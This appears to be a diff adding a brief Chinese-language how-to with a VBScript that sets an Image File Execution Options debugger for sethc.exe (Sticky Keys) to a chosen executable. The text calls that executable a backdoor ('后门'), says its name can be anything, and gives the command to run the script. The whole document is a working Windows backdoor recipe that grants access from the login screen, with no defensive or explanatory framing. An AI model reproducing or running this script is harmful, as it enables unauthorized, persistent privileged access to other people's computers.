@@ -1,0 +1,11 @@
+方法：
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\debugger",WScript.CreateObject("WScript.shell").ExpandEnvironmentStrings("%SystemRoot%")&"\system32\obc32.exe","REG_SZ" 
+ 
+ 将以上代码保存为*.vbs
+
+后门文件名obc32.exe可以随便写
+
+
+cscript 1.vbs
